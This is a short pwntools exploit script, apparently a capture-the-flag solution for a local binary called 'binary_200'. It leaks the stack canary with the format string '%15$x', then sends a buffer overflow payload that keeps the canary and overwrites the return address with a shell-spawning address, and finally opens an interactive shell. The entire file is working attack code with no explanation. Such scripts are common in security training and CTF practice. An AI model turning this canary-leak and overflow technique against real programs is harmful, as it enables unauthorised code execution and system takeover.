from pwn import *

io = process('./binary_200')

io.sendline("%15$x")
canary = int(io.recv(),16)
log.info("canary: 0x%x" %canary)

binsh = 0x0804854d
payload = b"A"*0x28+p32(canary)+b"A"*0xc+p32(binsh)
io.sendline(payload)
io.interactive()


